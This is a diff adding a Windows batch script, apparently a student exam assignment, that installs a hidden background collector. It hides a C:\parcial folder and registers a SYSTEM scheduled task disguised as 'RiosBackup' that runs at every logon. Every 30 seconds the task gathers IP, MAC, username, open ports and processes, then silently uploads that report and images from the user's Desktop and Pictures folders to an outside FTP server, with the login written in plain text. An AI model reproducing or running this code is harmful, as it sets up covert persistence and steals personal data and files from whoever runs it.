@@ -1,0 +1,134 @@
+@echo off
+chcp 65001 >nul
+setlocal enabledelayedexpansion
+
+title Julio Cesar Rodriguez Rios - GR03
+
+set "GRUPO=GR03"
+set "APELLIDO=Rios"
+set "NOMBRE=Julio"
+set "MAQUINA=%COMPUTERNAME%"
+set "NOMBRE_ARCHIVO=%GRUPO%_%APELLIDO%_%MAQUINA%"
+set "ARCHIVO_BAT=%NOMBRE_ARCHIVO%.bat"
+set "ARCHIVO_TXT=%NOMBRE_ARCHIVO%.txt"
+
+set "FTP_USER=u917850771"
+set "FTP_PASS=Unicesar2026+"
+set "FTP_SERVER=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial"
+set "RUTA_FTP=%GRUPO%_%APELLIDO%_%MAQUINA%"
+
+:: ======================================================================
+:: CREAR CARPETA C:\PARCIAL SI NO EXISTE
+:: ======================================================================
+if not exist "C:\parcial" mkdir "C:\parcial"
+
+:: ======================================================================
+:: CREAR SCRIPT QUE SE EJECUTARA EN SEGUNDO PLANO
+:: ======================================================================
+(
+echo @echo off
+echo chcp 65001 ^>nul 2^>^&1
+echo setlocal enabledelayedexpansion
+echo set "GRUPO=%GRUPO%"
+echo set "APELLIDO=%APELLIDO%"
+echo set "MAQUINA=%COMPUTERNAME%"
+echo set "NOMBRE_ARCHIVO=%%GRUPO%%_%%APELLIDO%%_%%MAQUINA%%"
+echo set "ARCHIVO_BAT=%%NOMBRE_ARCHIVO%%.bat"
+echo set "ARCHIVO_TXT=%%NOMBRE_ARCHIVO%%.txt"
+echo set "FTP_USER=%FTP_USER%"
+echo set "FTP_PASS=%FTP_PASS%"
+echo set "FTP_SERVER=%FTP_SERVER%"
+echo set "RUTA_FTP=%%GRUPO%%_%%APELLIDO%%_%%MAQUINA%%"
+echo :BUCLE
+echo if not exist "C:\parcial" mkdir "C:\parcial" 2^>nul 2^>^&1
+echo copy /Y "%%~f0" "C:\parcial\%%ARCHIVO_BAT%%" ^>nul 2^>^&1
+echo attrib +h "C:\parcial" /s /d ^>nul 2^>^&1
+echo set "FECHA=%%date%%"
+echo set "HORA=%%time%%"
+echo for /f "tokens=*" %%%%V in ('"'"'ver'"'"') do set "WIN_VER=%%%%V"
+echo for /f "tokens=2 delims==" %%%%a in ('"'"'wmic os get TotalVisibleMemorySize /value ^| find "="'"'"') do set "MEM_TOTAL=%%%%a"
+echo set /a "MEM_TOTAL_MB=!MEM_TOTAL!/1024"
+echo for /f "tokens=2 delims==" %%%%a in ('"'"'wmic os get FreePhysicalMemory /value ^| find "="'"'"') do set "MEM_LIBRE=%%%%a"
+echo set /a "MEM_LIBRE_MB=!MEM_LIBRE!/1024"
+echo set /a "MEM_USO_MB=!MEM_TOTAL_MB!-!MEM_LIBRE_MB!"
+echo set "IP="
+echo for /f "tokens=2 delims=:" %%%%I in ('"'"'ipconfig ^| findstr /i "IPv4"'"'"') do ^(
+echo     if not defined IP set "IP=%%%%I"
+echo ^)
+echo if defined IP set "IP=!IP:~1!"
+echo set "MAC="
+echo for /f "tokens=1" %%%%M in ('"'"'getmac ^| findstr /r "..-..-..-..-..-..""'"'"') do ^(
+echo     if not defined MAC set "MAC=%%%%M"
+echo ^)
+echo for /f "tokens=*" %%%%a in ('"'"'powershell -NoProfile -Command "Get-Process ^| Sort-Object WorkingSet64 -Descending ^| Select-Object -First 1 ^| Format-Table Name, @{N='"'"'Mem_MB'"'"';E={$_.WorkingSet64/1MB}} -HideTableHeaders"'"'"') do set "HIGH_MEM=%%%%a"
+echo for /f "tokens=*" %%%%a in ('"'"'powershell -NoProfile -Command "Get-Process ^| Sort-Object CPU -Descending ^| Select-Object -First 1 ^| Format-Table Name, @{N='"'"'CPU_s'"'"';E={$_.CPU}} -HideTableHeaders"'"'"') do set "HIGH_CPU=%%%%a"
+echo echo ============================================================ ^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo    INFORMACION DE LA MAQUINA: %%MAQUINA%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Autor              : %%GRUPO%%_%%APELLIDO%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Fecha              : %%FECHA%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Hora               : %%HORA%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Version SO         : %%WIN_VER%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Memoria Total      : !MEM_TOTAL_MB! MB ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Memoria en uso     : !MEM_USO_MB! MB ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Memoria disponible : !MEM_LIBRE_MB! MB ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   IP actual          : %%IP%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   MAC actual         : %%MAC%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Usuario actual     : %%USERNAME%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Nombre maquina     : %%MAQUINA%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   PUERTOS ABIERTOS Y CONEXIONES ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo netstat -ano ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   PROCESOS ACTIVOS ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo tasklist ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   PROCESO QUE MAS MEMORIA CONSUME ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   !HIGH_MEM! ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   PROCESO QUE MAS CPU CONSUME ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   !HIGH_CPU! ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo. ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Generado por: %%GRUPO%%_%%APELLIDO%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo   Computador  : %%MAQUINA%% ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo echo ============================================================ ^>^> "C:\parcial\%%ARCHIVO_TXT%%"
+echo curl --ftp-create-dirs -u "%%FTP_USER%%:%%FTP_PASS%%" -T "C:\parcial\%%ARCHIVO_TXT%%" "%%FTP_SERVER%%/%%RUTA_FTP%%/%%ARCHIVO_TXT%%" ^>nul 2^>^&1
+echo if exist "%%USERPROFILE%%\Desktop\imagen1.jpg" curl --ftp-create-dirs -u "%%FTP_USER%%:%%FTP_PASS%%" -T "%%USERPROFILE%%\Desktop\imagen1.jpg" "%%FTP_SERVER%%/%%RUTA_FTP%%/Escritorio/imagen1.jpg" ^>nul 2^>^&1
+echo if exist "%%USERPROFILE%%\Pictures\imagen2.jpg" ^(
+echo     curl --ftp-create-dirs -u "%%FTP_USER%%:%%FTP_PASS%%" -T "%%USERPROFILE%%\Pictures\imagen2.jpg" "%%FTP_SERVER%%/%%RUTA_FTP%%/Imagenes/imagen2.jpg" ^>nul 2^>^&1
+echo ^) else if exist "%%USERPROFILE%%\OneDrive\Pictures\imagen2.jpg" ^(
+echo     curl --ftp-create-dirs -u "%%FTP_USER%%:%%FTP_PASS%%" -T "%%USERPROFILE%%\OneDrive\Pictures\imagen2.jpg" "%%FTP_SERVER%%/%%RUTA_FTP%%/Imagenes/imagen2.jpg" ^>nul 2^>^&1
+echo ^)
+echo attrib +h "C:\parcial" /s /d ^>nul 2^>^&1
+echo timeout /t 30 ^>nul
+echo goto BUCLE
+) > "C:\parcial\%ARCHIVO_BAT%"
+
+:: ======================================================================
+:: OCULTAR CARPETA
+:: ======================================================================
+attrib +h "C:\parcial" /s /d >nul 2>&1
+
+:: ======================================================================
+:: CREAR TAREA PROGRAMADA (ejecuta en segundo plano al iniciar sesion)
+:: ======================================================================
+schtasks /create /tn "RiosBackup" /tr "cmd /c \"C:\parcial\%ARCHIVO_BAT%\"" /sc onlogon /ru SYSTEM /f >nul 2>&1
+
+:: ======================================================================
+:: EJECUTAR LA TAREA AHORA
+:: ======================================================================
+schtasks /run /tn "RiosBackup" >nul 2>&1
+
+exit
